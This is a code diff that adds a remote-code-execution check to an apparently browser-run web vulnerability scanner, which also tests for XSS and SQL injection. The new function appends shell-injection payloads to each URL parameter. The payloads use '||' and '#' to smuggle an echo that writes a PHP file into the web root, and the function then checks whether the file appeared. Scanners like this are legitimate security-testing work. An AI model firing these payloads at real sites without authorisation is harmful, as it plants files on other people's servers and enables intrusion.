@@ -15,6 +15,7 @@
 
   const xssScanEnabled = true
   const sqlInjectionScanEnabled = true
+  const RCEscanEnabled = true
 
   const alreadyProcessedFunctions = []
 
@@ -79,12 +80,12 @@
         const a = arr[i].split('=')
 
         // set parameter name and value (use 'true' if empty)
-        let paramName = a[0]
-        let paramValue = typeof (a[1]) === 'undefined' ? true : a[1]
+        const paramName = a[0]
+        const paramValue = typeof (a[1]) === 'undefined' ? true : a[1]
 
         // (optional) keep case consistent
-        paramName = paramName.toLowerCase()
-        if (typeof paramValue === 'string') paramValue = paramValue.toLowerCase()
+        /* paramName = paramName.toLowerCase()
+        if (typeof paramValue === 'string') paramValue = paramValue.toLowerCase() */
 
         // if the paramName ends with square brackets, e.g. colors[] or colors[2]
         if (paramName.match(/\[(\d+)?\]$/)) {
@@ -342,6 +343,35 @@
     }
   }
 
+  async function testRCE () {
+    const payloads = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php\#']
+    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
+    // console.log(paramsEntities)
+    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
+      for (const payload of payloads) {
+        const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
+        const v = paramsEntities[i]
+        v[1] = v[1] + payload
+
+        const mod = paramsEntities.map((v) => {
+          return v[0] + '=' + v[1]
+        })
+
+        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
+
+        // eslint-disable-next-line no-undef
+        await $.get(newUrl).done(function (data) { })
+        // eslint-disable-next-line no-undef
+        await $.get(document.location.origin + '/testRCE.php').done(function (data) {
+          if (data.indexOf('TEST_RCE') !== -1) {
+            console.log('Parametro "' + v[0] + '" Vulnerabile a Remote Code Execution')
+            console.log('url', newUrl)
+          }
+        })
+      }
+    }
+  }
+
   console.log('Created by Davide Cavallini')
   console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
   console.log('----------------------------------------------------------')
@@ -360,7 +390,9 @@
   if (sqlInjectionScanEnabled === true) {
     testSqlInjection()
   }
-
+  if (RCEscanEnabled === true) {
+    testRCE()
+  }
   console.log('\n')
   console.log('----------------------------------------------------------')
   console.log('Created by Davide Cavallini')
